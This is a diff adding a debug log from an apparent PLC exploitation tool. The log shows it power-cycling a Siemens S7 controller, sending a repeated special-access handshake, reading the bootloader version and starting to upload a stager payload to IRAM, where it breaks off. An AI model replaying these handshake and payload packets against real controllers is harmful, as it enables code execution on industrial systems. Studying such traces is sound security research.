@@ -1,0 +1,572 @@
+﻿[2025-09-17 16:35:06] Info SOCAT: No socat processes found running
+[2025-09-17 16:35:11] Communication Configuring serial device /dev/ttyUSB0 with stty...
+[2025-09-17 16:35:11] Info Serial device /dev/ttyUSB0 configured successfully
+[2025-09-17 16:35:11] Communication Starting socat with arguments: -v -b 4 -x TCP-LISTEN:1238,fork,reuseaddr /dev/ttyUSB0
+[2025-09-17 16:35:15] Communication Connecting to Modbus power supply...
+[2025-09-17 16:35:15] Info Modbus client created and connected.
+[2025-09-17 16:35:19] Info EXPLOIT: Starting automatic PLC exploitation sequence
+[2025-09-17 16:35:19] Info EXPLOIT: Connecting to socat at localhost:1238
+[2025-09-17 16:35:19] Communication Connecting to PLC at localhost:1238...
+[2025-09-17 16:35:19] Communication PLC client connected.
+[2025-09-17 16:35:19] Info EXPLOIT: Connected to socat successfully
+[2025-09-17 16:35:19] Info EXPLOIT: Power cycling PLC (delay: 1000ms)
+[2025-09-17 16:35:19] Info EXPLOIT: Turning off power supply
+[2025-09-17 16:35:19] Communication Turning off power supply.
+[2025-09-17 16:35:19] Info EXPLOIT: Waiting 1 seconds before turning power back on
+[2025-09-17 16:35:19] Info Power supply turned off.
+[2025-09-17 16:35:20] Info EXPLOIT: Turning on power supply
+[2025-09-17 16:35:20] Communication Turning on power supply.
+[2025-09-17 16:35:20] Info EXPLOIT: Power supply turned on successfully
+[2025-09-17 16:35:20] Info EXPLOIT: Starting handshake loop (100 attempts)
+[2025-09-17 16:35:20] Info EXPLOIT: Handshake attempt 1/100
+[2025-09-17 16:35:20] Info Power supply turned on.
+[2025-09-17 16:35:20] Communication Attempting handshake...
+[2025-09-17 16:35:20] Error [socat ERR] > 2025/09/17 16:35:20.000777456  length=4 from=0 to=3
+[2025-09-17 16:35:20] Error [socat ERR]  41 41 41 41                                      AAAA
+[2025-09-17 16:35:20] Error [socat ERR] --
+[2025-09-17 16:35:20] Error [socat ERR] > 2025/09/17 16:35:20.000777614  length=4 from=4 to=7
+[2025-09-17 16:35:20] Error [socat ERR]  4d 46 47 54                                      MFGT
+[2025-09-17 16:35:20] Error [socat ERR] --
+[2025-09-17 16:35:20] Error [socat ERR] > 2025/09/17 16:35:20.000777737  length=1 from=8 to=8
+[2025-09-17 16:35:20] Error [socat ERR]  31                                               1
+[2025-09-17 16:35:20] Error [socat ERR] --
+[2025-09-17 16:35:20] Error [socat ERR] < 2025/09/17 16:35:20.000779740  length=2 from=0 to=1
+[2025-09-17 16:35:20] Error [socat ERR]  0a                                               .
+[2025-09-17 16:35:20] Error [socat ERR]  ea                                               .
+[2025-09-17 16:35:20] Error [socat ERR] --
+[2025-09-17 16:35:20] Info Final handshake response: 0AEA (ASCII: \x0A\xEA)
+[2025-09-17 16:35:20] Error [socat ERR] > 2025/09/17 16:35:20.000845592  length=4 from=9 to=12
+[2025-09-17 16:35:20] Error [socat ERR]  41 41 41 41                                      AAAA
+[2025-09-17 16:35:20] Error [socat ERR] --
+[2025-09-17 16:35:20] Error [socat ERR] > 2025/09/17 16:35:20.000845728  length=4 from=13 to=16
+[2025-09-17 16:35:20] Error [socat ERR]  4d 46 47 54                                      MFGT
+[2025-09-17 16:35:20] Error [socat ERR] --
+[2025-09-17 16:35:20] Error [socat ERR] > 2025/09/17 16:35:20.000845810  length=1 from=17 to=17
+[2025-09-17 16:35:20] Error [socat ERR]  31                                               1
+[2025-09-17 16:35:20] Error [socat ERR] --
+[2025-09-17 16:35:20] Error [socat ERR] < 2025/09/17 16:35:20.000847780  length=2 from=2 to=3
+[2025-09-17 16:35:20] Error [socat ERR]  0a                                               .
+[2025-09-17 16:35:20] Error [socat ERR]  ea                                               .
+[2025-09-17 16:35:20] Error [socat ERR] --
+[2025-09-17 16:35:20] Info Final handshake response: 0AEA (ASCII: \x0A\xEA)
+[2025-09-17 16:35:20] Error [socat ERR] > 2025/09/17 16:35:20.000909273  length=4 from=18 to=21
+[2025-09-17 16:35:20] Error [socat ERR]  41 41 41 41                                      AAAA
+[2025-09-17 16:35:20] Error [socat ERR] --
+[2025-09-17 16:35:20] Error [socat ERR] > 2025/09/17 16:35:20.000909408  length=4 from=22 to=25
+[2025-09-17 16:35:20] Error [socat ERR]  4d 46 47 54                                      MFGT
+[2025-09-17 16:35:20] Error [socat ERR] --
+[2025-09-17 16:35:20] Error [socat ERR] > 2025/09/17 16:35:20.000909495  length=1 from=26 to=26
+[2025-09-17 16:35:20] Error [socat ERR]  31                                               1
+[2025-09-17 16:35:20] Error [socat ERR] --
+[2025-09-17 16:35:20] Error [socat ERR] < 2025/09/17 16:35:20.000911441  length=2 from=4 to=5
+[2025-09-17 16:35:20] Error [socat ERR]  fa ea                                            ..
+[2025-09-17 16:35:20] Error [socat ERR] --
+[2025-09-17 16:35:20] Info Final handshake response: FAEA (ASCII: \xFA\xEA)
+[2025-09-17 16:35:20] Error [socat ERR] > 2025/09/17 16:35:20.000972417  length=4 from=27 to=30
+[2025-09-17 16:35:20] Error [socat ERR]  41 41 41 41                                      AAAA
+[2025-09-17 16:35:20] Error [socat ERR] --
+[2025-09-17 16:35:20] Error [socat ERR] > 2025/09/17 16:35:20.000972556  length=4 from=31 to=34
+[2025-09-17 16:35:20] Error [socat ERR]  4d 46 47 54                                      MFGT
+[2025-09-17 16:35:20] Error [socat ERR] --
+[2025-09-17 16:35:20] Error [socat ERR] > 2025/09/17 16:35:20.000972719  length=1 from=35 to=35
+[2025-09-17 16:35:20] Error [socat ERR]  31                                               1
+[2025-09-17 16:35:20] Error [socat ERR] --
+[2025-09-17 16:35:20] Error [socat ERR] < 2025/09/17 16:35:20.000974569  length=2 from=6 to=7
+[2025-09-17 16:35:20] Error [socat ERR]  fa ea                                            ..
+[2025-09-17 16:35:20] Error [socat ERR] --
+[2025-09-17 16:35:21] Info Final handshake response: FAEA (ASCII: \xFA\xEA)
+[2025-09-17 16:35:21] Error [socat ERR] > 2025/09/17 16:35:21.000037202  length=4 from=36 to=39
+[2025-09-17 16:35:21] Error [socat ERR]  41 41 41 41                                      AAAA
+[2025-09-17 16:35:21] Error [socat ERR] --
+[2025-09-17 16:35:21] Error [socat ERR] > 2025/09/17 16:35:21.000037329  length=4 from=40 to=43
+[2025-09-17 16:35:21] Error [socat ERR]  4d 46 47 54                                      MFGT
+[2025-09-17 16:35:21] Error [socat ERR] --
+[2025-09-17 16:35:21] Error [socat ERR] > 2025/09/17 16:35:21.000037436  length=1 from=44 to=44
+[2025-09-17 16:35:21] Error [socat ERR]  31                                               1
+[2025-09-17 16:35:21] Error [socat ERR] --
+[2025-09-17 16:35:21] Error [socat ERR] > 2025/09/17 16:35:21.000098143  length=4 from=45 to=48
+[2025-09-17 16:35:21] Error [socat ERR]  41 41 41 41                                      AAAA
+[2025-09-17 16:35:21] Error [socat ERR] --
+[2025-09-17 16:35:21] Error [socat ERR] > 2025/09/17 16:35:21.000098718  length=4 from=49 to=52
+[2025-09-17 16:35:21] Error [socat ERR]  4d 46 47 54                                      MFGT
+[2025-09-17 16:35:21] Error [socat ERR] --
+[2025-09-17 16:35:21] Error [socat ERR] > 2025/09/17 16:35:21.000098800  length=1 from=53 to=53
+[2025-09-17 16:35:21] Error [socat ERR]  31                                               1
+[2025-09-17 16:35:21] Error [socat ERR] --
+[2025-09-17 16:35:21] Error [socat ERR] > 2025/09/17 16:35:21.000160657  length=4 from=54 to=57
+[2025-09-17 16:35:21] Error [socat ERR]  41 41 41 41                                      AAAA
+[2025-09-17 16:35:21] Error [socat ERR] --
+[2025-09-17 16:35:21] Error [socat ERR] > 2025/09/17 16:35:21.000160830  length=4 from=58 to=61
+[2025-09-17 16:35:21] Error [socat ERR]  4d 46 47 54                                      MFGT
+[2025-09-17 16:35:21] Error [socat ERR] --
+[2025-09-17 16:35:21] Error [socat ERR] > 2025/09/17 16:35:21.000160875  length=1 from=62 to=62
+[2025-09-17 16:35:21] Error [socat ERR]  31                                               1
+[2025-09-17 16:35:21] Error [socat ERR] --
+[2025-09-17 16:35:21] Error [socat ERR] > 2025/09/17 16:35:21.000221926  length=4 from=63 to=66
+[2025-09-17 16:35:21] Error [socat ERR]  41 41 41 41                                      AAAA
+[2025-09-17 16:35:21] Error [socat ERR] --
+[2025-09-17 16:35:21] Error [socat ERR] > 2025/09/17 16:35:21.000222072  length=4 from=67 to=70
+[2025-09-17 16:35:21] Error [socat ERR]  4d 46 47 54                                      MFGT
+[2025-09-17 16:35:21] Error [socat ERR] --
+[2025-09-17 16:35:21] Error [socat ERR] > 2025/09/17 16:35:21.000222155  length=1 from=71 to=71
+[2025-09-17 16:35:21] Error [socat ERR]  31                                               1
+[2025-09-17 16:35:21] Error [socat ERR] --
+[2025-09-17 16:35:21] Error [socat ERR] > 2025/09/17 16:35:21.000283221  length=4 from=72 to=75
+[2025-09-17 16:35:21] Error [socat ERR]  41 41 41 41                                      AAAA
+[2025-09-17 16:35:21] Error [socat ERR] --
+[2025-09-17 16:35:21] Error [socat ERR] > 2025/09/17 16:35:21.000283358  length=4 from=76 to=79
+[2025-09-17 16:35:21] Error [socat ERR]  4d 46 47 54                                      MFGT
+[2025-09-17 16:35:21] Error [socat ERR] --
+[2025-09-17 16:35:21] Error [socat ERR] > 2025/09/17 16:35:21.000283472  length=1 from=80 to=80
+[2025-09-17 16:35:21] Error [socat ERR]  31                                               1
+[2025-09-17 16:35:21] Error [socat ERR] --
+[2025-09-17 16:35:21] Error [socat ERR] > 2025/09/17 16:35:21.000343921  length=4 from=81 to=84
+[2025-09-17 16:35:21] Error [socat ERR]  41 41 41 41                                      AAAA
+[2025-09-17 16:35:21] Error [socat ERR] --
+[2025-09-17 16:35:21] Error [socat ERR] > 2025/09/17 16:35:21.000344036  length=4 from=85 to=88
+[2025-09-17 16:35:21] Error [socat ERR]  4d 46 47 54                                      MFGT
+[2025-09-17 16:35:21] Error [socat ERR] --
+[2025-09-17 16:35:21] Error [socat ERR] > 2025/09/17 16:35:21.000344069  length=1 from=89 to=89
+[2025-09-17 16:35:21] Error [socat ERR]  31                                               1
+[2025-09-17 16:35:21] Error [socat ERR] --
+[2025-09-17 16:35:21] Error [socat ERR] > 2025/09/17 16:35:21.000405046  length=4 from=90 to=93
+[2025-09-17 16:35:21] Error [socat ERR]  41 41 41 41                                      AAAA
+[2025-09-17 16:35:21] Error [socat ERR] --
+[2025-09-17 16:35:21] Error [socat ERR] > 2025/09/17 16:35:21.000405194  length=4 from=94 to=97
+[2025-09-17 16:35:21] Error [socat ERR]  4d 46 47 54                                      MFGT
+[2025-09-17 16:35:21] Error [socat ERR] --
+[2025-09-17 16:35:21] Error [socat ERR] > 2025/09/17 16:35:21.000405270  length=1 from=98 to=98
+[2025-09-17 16:35:21] Error [socat ERR]  31                                               1
+[2025-09-17 16:35:21] Error [socat ERR] --
+[2025-09-17 16:35:21] Error [socat ERR] > 2025/09/17 16:35:21.000465942  length=4 from=99 to=102
+[2025-09-17 16:35:21] Error [socat ERR]  41 41 41 41                                      AAAA
+[2025-09-17 16:35:21] Error [socat ERR] --
+[2025-09-17 16:35:21] Error [socat ERR] > 2025/09/17 16:35:21.000466061  length=4 from=103 to=106
+[2025-09-17 16:35:21] Error [socat ERR]  4d 46 47 54                                      MFGT
+[2025-09-17 16:35:21] Error [socat ERR] --
+[2025-09-17 16:35:21] Error [socat ERR] > 2025/09/17 16:35:21.000466099  length=1 from=107 to=107
+[2025-09-17 16:35:21] Error [socat ERR]  31                                               1
+[2025-09-17 16:35:21] Error [socat ERR] --
+[2025-09-17 16:35:21] Error [socat ERR] > 2025/09/17 16:35:21.000527589  length=4 from=108 to=111
+[2025-09-17 16:35:21] Error [socat ERR]  41 41 41 41                                      AAAA
+[2025-09-17 16:35:21] Error [socat ERR] --
+[2025-09-17 16:35:21] Error [socat ERR] > 2025/09/17 16:35:21.000527706  length=4 from=112 to=115
+[2025-09-17 16:35:21] Error [socat ERR]  4d 46 47 54                                      MFGT
+[2025-09-17 16:35:21] Error [socat ERR] --
+[2025-09-17 16:35:21] Error [socat ERR] > 2025/09/17 16:35:21.000527748  length=1 from=116 to=116
+[2025-09-17 16:35:21] Error [socat ERR]  31                                               1
+[2025-09-17 16:35:21] Error [socat ERR] --
+[2025-09-17 16:35:21] Info Received handshake response: 052D435055E6 (ASCII: \x05-CPU\xE6)
+[2025-09-17 16:35:21] Info SUCCESS: Got special access greeting: ASCII: \x05-CPU\xE6
+[2025-09-17 16:35:21] Info EXPLOIT: Handshake successful - entered special access mode!
+[2025-09-17 16:35:21] Info EXPLOIT: Retrieving PLC version information
+[2025-09-17 16:35:21] Error [socat ERR] < 2025/09/17 16:35:21.000533068  length=4 from=8 to=11
+[2025-09-17 16:35:21] Error [socat ERR]  05 2d 43 50                                      .-CP
+[2025-09-17 16:35:21] Error [socat ERR] --
+[2025-09-17 16:35:21] Error [socat ERR] < 2025/09/17 16:35:21.000533147  length=2 from=12 to=13
+[2025-09-17 16:35:21] Error [socat ERR]  55 e6                                            U.
+[2025-09-17 16:35:21] Error [socat ERR] --
+[2025-09-17 16:35:21] Info Sending packet: 0200FE
+[2025-09-17 16:35:21] Error [socat ERR] > 2025/09/17 16:35:21.000555235  length=2 from=117 to=118
+[2025-09-17 16:35:21] Error [socat ERR]  02 00                                            ..
+[2025-09-17 16:35:21] Error [socat ERR] --
+[2025-09-17 16:35:21] Error [socat ERR] > 2025/09/17 16:35:21.000596817  length=1 from=119 to=119
+[2025-09-17 16:35:21] Error [socat ERR]  fe                                               .
+[2025-09-17 16:35:21] Error [socat ERR] --
+[2025-09-17 16:35:21] Info RecvPacket: Expected packet length (excluding checksum): 9 bytes
+[2025-09-17 16:35:21] Info RecvPacket: Received 3 bytes: 000056
+[2025-09-17 16:35:21] Info RecvPacket: Still need 6 more bytes
+[2025-09-17 16:35:21] Error [socat ERR] < 2025/09/17 16:35:21.000601728  length=4 from=14 to=17
+[2025-09-17 16:35:21] Error [socat ERR]  09 00 00 56                                      ...V
+[2025-09-17 16:35:21] Error [socat ERR] --
+[2025-09-17 16:35:21] Error [socat ERR] < 2025/09/17 16:35:21.000601810  length=4 from=18 to=21
+[2025-09-17 16:35:21] Error [socat ERR]  04 02 01 00                                      ....
+[2025-09-17 16:35:21] Error [socat ERR] --
+[2025-09-17 16:35:21] Error [socat ERR] < 2025/09/17 16:35:21.000601830  length=2 from=22 to=23
+[2025-09-17 16:35:21] Error [socat ERR]  01 99                                            ..
+[2025-09-17 16:35:21] Error [socat ERR] --
+[2025-09-17 16:35:21] Info RecvPacket: Received 6 bytes: 040201000199
+[2025-09-17 16:35:21] Info RecvPacket: Still need 0 more bytes
+[2025-09-17 16:35:21] Info RecvPacket: Complete packet (including checksum) received: 09000056040201000199 (ASCII: \x09\x00\x00V\x04\x02\x01\x00\x01\x99)
+[2025-09-17 16:35:21] Info RecvPacket: Received checksum: 99, Calculated checksum: 99
+[2025-09-17 16:35:21] Info RecvPacket: Checksum calculated on 9 bytes: 090000560402010001
+[2025-09-17 16:35:21] Info RecvPacket: Extracted payload: 0000560402010001
+[2025-09-17 16:35:21] Info Got PLC bootLoader version: HEX=0000560402010001 ASCII=\x00\x00V\x04\x02\x01\x00\x01
+[2025-09-17 16:35:21] Info Got PLC bootLoader version (formatted): V4.2.1
+[2025-09-17 16:35:21] Info EXPLOIT: PLC Version retrieved: V4.2.1
+[2025-09-17 16:35:21] Info EXPLOIT: Installing stager payload
+[2025-09-17 16:35:21] Info EXPLOIT: Loaded stager (292 bytes) from /home/miniyo88/Desktop/qodo_new_implement/SiemensS7-Bootloader/reference_code/csharp-application/PLCSploit.Gui/bin/Release/net8.0/stager/stager.bin
+[2025-09-17 16:35:21] Info Installing stager...
+[2025-09-17 16:35:21] Info Sending packet: 04803BC27F
+[2025-09-17 16:35:21] Error [socat ERR] > 2025/09/17 16:35:21.000666379  length=2 from=120 to=121
+[2025-09-17 16:35:21] Error [socat ERR]  04 80                                            ..
+[2025-09-17 16:35:21] Error [socat ERR] --
+[2025-09-17 16:35:21] Error [socat ERR] > 2025/09/17 16:35:21.000706649  length=3 from=122 to=124
+[2025-09-17 16:35:21] Error [socat ERR]  3b c2 7f                                         ;..
+[2025-09-17 16:35:21] Error [socat ERR] --
+[2025-09-17 16:35:21] Info RecvPacket: Expected packet length (excluding checksum): 3 bytes
+[2025-09-17 16:35:21] Info RecvPacket: Received 3 bytes: 80007D
+[2025-09-17 16:35:21] Info RecvPacket: Still need 0 more bytes
+[2025-09-17 16:35:21] Error [socat ERR] < 2025/09/17 16:35:21.000709705  length=4 from=24 to=27
+[2025-09-17 16:35:21] Error [socat ERR]  03 80 00 7d                                      ...}
+[2025-09-17 16:35:21] Error [socat ERR] --
+[2025-09-17 16:35:21] Info RecvPacket: Complete packet (including checksum) received: 0380007D (ASCII: \x03\x80\x00})
+[2025-09-17 16:35:21] Info RecvPacket: Received checksum: 7D, Calculated checksum: 7D
+[2025-09-17 16:35:21] Info RecvPacket: Checksum calculated on 3 bytes: 038000
+[2025-09-17 16:35:21] Info RecvPacket: Extracted payload: 8000
+[2025-09-17 16:35:21] Info Writing to IRAM 0000/0124
+[2025-09-17 16:35:21] Info Sending packet: 18845A2E00030100FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFE8
+[2025-09-17 16:35:21] Error [socat ERR] > 2025/09/17 16:35:21.000731656  length=2 from=125 to=126
+[2025-09-17 16:35:21] Error [socat ERR]  18 84                                            ..
+[2025-09-17 16:35:21] Error [socat ERR] --
+[2025-09-17 16:35:21] Error [socat ERR] > 2025/09/17 16:35:21.000774598  length=4 from=127 to=130
+[2025-09-17 16:35:21] Error [socat ERR]  5a 2e 00 03                                      Z...
+[2025-09-17 16:35:21] Error [socat ERR] --
+[2025-09-17 16:35:21] Error [socat ERR] > 2025/09/17 16:35:21.000774834  length=2 from=131 to=132
+[2025-09-17 16:35:21] Error [socat ERR]  01 00                                            ..
+[2025-09-17 16:35:21] Error [socat ERR] --
+[2025-09-17 16:35:21] Error [socat ERR] > 2025/09/17 16:35:21.000774929  length=2 from=133 to=134
+[2025-09-17 16:35:21] Error [socat ERR]  ff ff                                            ..
+[2025-09-17 16:35:21] Error [socat ERR] --
+[2025-09-17 16:35:21] Error [socat ERR] > 2025/09/17 16:35:21.000783836  length=2 from=135 to=136
+[2025-09-17 16:35:21] Error [socat ERR]  ff ff                                            ..
+[2025-09-17 16:35:21] Error [socat ERR] --
+[2025-09-17 16:35:21] Error [socat ERR] > 2025/09/17 16:35:21.000794519  length=2 from=137 to=138
+[2025-09-17 16:35:21] Error [socat ERR]  ff ff                                            ..
+[2025-09-17 16:35:21] Error [socat ERR] --
+[2025-09-17 16:35:21] Error [socat ERR] > 2025/09/17 16:35:21.000804727  length=2 from=139 to=140
+[2025-09-17 16:35:21] Error [socat ERR]  ff ff                                            ..
+[2025-09-17 16:35:21] Error [socat ERR] --
+[2025-09-17 16:35:21] Error [socat ERR] > 2025/09/17 16:35:21.000814876  length=2 from=141 to=142
+[2025-09-17 16:35:21] Error [socat ERR]  ff ff                                            ..
+[2025-09-17 16:35:21] Error [socat ERR] --
+[2025-09-17 16:35:21] Error [socat ERR] > 2025/09/17 16:35:21.000825689  length=2 from=143 to=144
+[2025-09-17 16:35:21] Error [socat ERR]  ff ff                                            ..
+[2025-09-17 16:35:21] Error [socat ERR] --
+[2025-09-17 16:35:21] Error [socat ERR] > 2025/09/17 16:35:21.000835975  length=2 from=145 to=146
+[2025-09-17 16:35:21] Error [socat ERR]  ff ff                                            ..
+[2025-09-17 16:35:21] Error [socat ERR] --
+[2025-09-17 16:35:21] Error [socat ERR] > 2025/09/17 16:35:21.000846132  length=2 from=147 to=148
+[2025-09-17 16:35:21] Error [socat ERR]  ff ff                                            ..
+[2025-09-17 16:35:21] Error [socat ERR] --
+[2025-09-17 16:35:21] Error [socat ERR] > 2025/09/17 16:35:21.000857703  length=1 from=149 to=149
+[2025-09-17 16:35:21] Error [socat ERR]  e8                                               .
+[2025-09-17 16:35:21] Error [socat ERR] --
+[2025-09-17 16:35:21] Error [socat ERR] < 2025/09/17 16:35:21.000860519  length=4 from=28 to=31
+[2025-09-17 16:35:21] Error [socat ERR]  05 84 ff 00                                      ....
+[2025-09-17 16:35:21] Error [socat ERR] --
+[2025-09-17 16:35:21] Error [socat ERR] < 2025/09/17 16:35:21.000860583  length=2 from=32 to=33
+[2025-09-17 16:35:21] Error [socat ERR]  76 02                                            v.
+[2025-09-17 16:35:21] Error [socat ERR] --
+[2025-09-17 16:35:21] Info RecvPacket: Expected packet length (excluding checksum): 5 bytes
+[2025-09-17 16:35:21] Info RecvPacket: Received 3 bytes: 84FF00
+[2025-09-17 16:35:21] Info RecvPacket: Still need 2 more bytes
+[2025-09-17 16:35:21] Info RecvPacket: Received 2 bytes: 7602
+[2025-09-17 16:35:21] Info RecvPacket: Still need 0 more bytes
+[2025-09-17 16:35:21] Info RecvPacket: Complete packet (including checksum) received: 0584FF007602 (ASCII: \x05\x84\xFF\x00v\x02)
+[2025-09-17 16:35:21] Info RecvPacket: Received checksum: 02, Calculated checksum: 02
+[2025-09-17 16:35:21] Info RecvPacket: Checksum calculated on 5 bytes: 0584FF0076
+[2025-09-17 16:35:21] Info RecvPacket: Extracted payload: 84FF0076
+[2025-09-17 16:35:21] Info Sending packet: 18845A2E00030100E92D5FFFE0222002E5C12000E590B00352
+[2025-09-17 16:35:21] Error [socat ERR] > 2025/09/17 16:35:21.000926334  length=2 from=150 to=151
+[2025-09-17 16:35:21] Error [socat ERR]  18 84                                            ..
+[2025-09-17 16:35:21] Error [socat ERR] --
+[2025-09-17 16:35:21] Error [socat ERR] > 2025/09/17 16:35:21.000966641  length=4 from=152 to=155
+[2025-09-17 16:35:21] Error [socat ERR]  5a 2e 00 03                                      Z...
+[2025-09-17 16:35:21] Error [socat ERR] --
+[2025-09-17 16:35:21] Error [socat ERR] > 2025/09/17 16:35:21.000966788  length=4 from=156 to=159
+[2025-09-17 16:35:21] Error [socat ERR]  01 00 e9 2d                                      ...-
+[2025-09-17 16:35:21] Error [socat ERR] --
+[2025-09-17 16:35:21] Error [socat ERR] > 2025/09/17 16:35:21.000977661  length=2 from=160 to=161
+[2025-09-17 16:35:21] Error [socat ERR]  5f ff                                            _.
+[2025-09-17 16:35:21] Error [socat ERR] --
+[2025-09-17 16:35:21] Error [socat ERR] > 2025/09/17 16:35:21.000987823  length=2 from=162 to=163
+[2025-09-17 16:35:21] Error [socat ERR]  e0 22                                            ."
+[2025-09-17 16:35:21] Error [socat ERR] --
+[2025-09-17 16:35:21] Error [socat ERR] > 2025/09/17 16:35:21.000997957  length=2 from=164 to=165
+[2025-09-17 16:35:21] Error [socat ERR]  20 02                                             .
+[2025-09-17 16:35:21] Error [socat ERR] --
+[2025-09-17 16:35:22] Error [socat ERR] > 2025/09/17 16:35:22.000008666  length=2 from=166 to=167
+[2025-09-17 16:35:22] Error [socat ERR]  e5 c1                                            ..
+[2025-09-17 16:35:22] Error [socat ERR] --
+[2025-09-17 16:35:22] Error [socat ERR] > 2025/09/17 16:35:22.000018793  length=2 from=168 to=169
+[2025-09-17 16:35:22] Error [socat ERR]  20 00                                             .
+[2025-09-17 16:35:22] Error [socat ERR] --
+[2025-09-17 16:35:22] Error [socat ERR] > 2025/09/17 16:35:22.000029428  length=2 from=170 to=171
+[2025-09-17 16:35:22] Error [socat ERR]  e5 90                                            ..
+[2025-09-17 16:35:22] Error [socat ERR] --
+[2025-09-17 16:35:22] Error [socat ERR] > 2025/09/17 16:35:22.000039669  length=2 from=172 to=173
+[2025-09-17 16:35:22] Error [socat ERR]  b0 03                                            ..
+[2025-09-17 16:35:22] Error [socat ERR] --
+[2025-09-17 16:35:22] Error [socat ERR] > 2025/09/17 16:35:22.000051832  length=1 from=174 to=174
+[2025-09-17 16:35:22] Error [socat ERR]  52                                               R
+[2025-09-17 16:35:22] Error [socat ERR] --
+[2025-09-17 16:35:22] Info RecvPacket: Expected packet length (excluding checksum): 5 bytes
+[2025-09-17 16:35:22] Info RecvPacket: Received 3 bytes: 84FF00
+[2025-09-17 16:35:22] Info RecvPacket: Still need 2 more bytes
+[2025-09-17 16:35:22] Error [socat ERR] < 2025/09/17 16:35:22.000054770  length=4 from=34 to=37
+[2025-09-17 16:35:22] Error [socat ERR]  05 84 ff 00                                      ....
+[2025-09-17 16:35:22] Error [socat ERR] --
+[2025-09-17 16:35:22] Error [socat ERR] < 2025/09/17 16:35:22.000054848  length=2 from=38 to=39
+[2025-09-17 16:35:22] Error [socat ERR]  76 02                                            v.
+[2025-09-17 16:35:22] Error [socat ERR] --
+[2025-09-17 16:35:22] Info RecvPacket: Received 2 bytes: 7602
+[2025-09-17 16:35:22] Info RecvPacket: Still need 0 more bytes
+[2025-09-17 16:35:22] Info RecvPacket: Complete packet (including checksum) received: 0584FF007602 (ASCII: \x05\x84\xFF\x00v\x02)
+[2025-09-17 16:35:22] Info RecvPacket: Received checksum: 02, Calculated checksum: 02
+[2025-09-17 16:35:22] Info RecvPacket: Checksum calculated on 5 bytes: 0584FF0076
+[2025-09-17 16:35:22] Info RecvPacket: Extracted payload: 84FF0076
+[2025-09-17 16:35:22] Info Writing to IRAM 0010/0124
+[2025-09-17 16:35:22] Info Sending packet: 18845A2E00030110FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFD8
+[2025-09-17 16:35:22] Error [socat ERR] > 2025/09/17 16:35:22.000118373  length=2 from=175 to=176
+[2025-09-17 16:35:22] Error [socat ERR]  18 84                                            ..
+[2025-09-17 16:35:22] Error [socat ERR] --
+[2025-09-17 16:35:22] Error [socat ERR] > 2025/09/17 16:35:22.000158626  length=4 from=177 to=180
+[2025-09-17 16:35:22] Error [socat ERR]  5a 2e 00 03                                      Z...
+[2025-09-17 16:35:22] Error [socat ERR] --
+[2025-09-17 16:35:22] Error [socat ERR] > 2025/09/17 16:35:22.000160198  length=2 from=181 to=182
+[2025-09-17 16:35:22] Error [socat ERR]  01 10                                            ..
+[2025-09-17 16:35:22] Error [socat ERR] --
+[2025-09-17 16:35:22] Error [socat ERR] > 2025/09/17 16:35:22.000162005  length=2 from=183 to=184
+[2025-09-17 16:35:22] Error [socat ERR]  ff ff                                            ..
+[2025-09-17 16:35:22] Error [socat ERR] --
+[2025-09-17 16:35:22] Error [socat ERR] > 2025/09/17 16:35:22.000172212  length=2 from=185 to=186
+[2025-09-17 16:35:22] Error [socat ERR]  ff ff                                            ..
+[2025-09-17 16:35:22] Error [socat ERR] --
+[2025-09-17 16:35:22] Error [socat ERR] > 2025/09/17 16:35:22.000182446  length=2 from=187 to=188
+[2025-09-17 16:35:22] Error [socat ERR]  ff ff                                            ..
+[2025-09-17 16:35:22] Error [socat ERR] --
+[2025-09-17 16:35:22] Error [socat ERR] > 2025/09/17 16:35:22.000193617  length=2 from=189 to=190
+[2025-09-17 16:35:22] Error [socat ERR]  ff ff                                            ..
+[2025-09-17 16:35:22] Error [socat ERR] --
+[2025-09-17 16:35:22] Error [socat ERR] > 2025/09/17 16:35:22.000202802  length=2 from=191 to=192
+[2025-09-17 16:35:22] Error [socat ERR]  ff ff                                            ..
+[2025-09-17 16:35:22] Error [socat ERR] --
+[2025-09-17 16:35:22] Error [socat ERR] > 2025/09/17 16:35:22.000213031  length=2 from=193 to=194
+[2025-09-17 16:35:22] Error [socat ERR]  ff ff                                            ..
+[2025-09-17 16:35:22] Error [socat ERR] --
+[2025-09-17 16:35:22] Error [socat ERR] > 2025/09/17 16:35:22.000225606  length=2 from=195 to=196
+[2025-09-17 16:35:22] Error [socat ERR]  ff ff                                            ..
+[2025-09-17 16:35:22] Error [socat ERR] --
+[2025-09-17 16:35:22] Error [socat ERR] > 2025/09/17 16:35:22.000235579  length=2 from=197 to=198
+[2025-09-17 16:35:22] Error [socat ERR]  ff ff                                            ..
+[2025-09-17 16:35:22] Error [socat ERR] --
+[2025-09-17 16:35:22] Error [socat ERR] > 2025/09/17 16:35:22.000246138  length=1 from=199 to=199
+[2025-09-17 16:35:22] Error [socat ERR]  d8                                               .
+[2025-09-17 16:35:22] Error [socat ERR] --
+[2025-09-17 16:35:22] Error [socat ERR] < 2025/09/17 16:35:22.000249521  length=4 from=40 to=43
+[2025-09-17 16:35:22] Info RecvPacket: Expected packet length (excluding checksum): 5 bytes
+[2025-09-17 16:35:22] Info RecvPacket: Received 3 bytes: 84FF00
+[2025-09-17 16:35:22] Info RecvPacket: Still need 2 more bytes
+[2025-09-17 16:35:22] Error [socat ERR]  05 84 ff 00                                      ....
+[2025-09-17 16:35:22] Error [socat ERR] --
+[2025-09-17 16:35:22] Error [socat ERR] < 2025/09/17 16:35:22.000250766  length=2 from=44 to=45
+[2025-09-17 16:35:22] Error [socat ERR]  76 02                                            v.
+[2025-09-17 16:35:22] Error [socat ERR] --
+[2025-09-17 16:35:22] Info RecvPacket: Received 2 bytes: 7602
+[2025-09-17 16:35:22] Info RecvPacket: Still need 0 more bytes
+[2025-09-17 16:35:22] Info RecvPacket: Complete packet (including checksum) received: 0584FF007602 (ASCII: \x05\x84\xFF\x00v\x02)
+[2025-09-17 16:35:22] Info RecvPacket: Received checksum: 02, Calculated checksum: 02
+[2025-09-17 16:35:22] Info RecvPacket: Checksum calculated on 5 bytes: 0584FF0076
+[2025-09-17 16:35:22] Info RecvPacket: Extracted payload: 84FF0076
+[2025-09-17 16:35:22] Info Sending packet: 18845A2E00030110E1A0A00BE0288008E1A0000AEB0000187E
+[2025-09-17 16:35:22] Error [socat ERR] > 2025/09/17 16:35:22.000315250  length=2 from=200 to=201
+[2025-09-17 16:35:22] Error [socat ERR]  18 84                                            ..
+[2025-09-17 16:35:22] Error [socat ERR] --
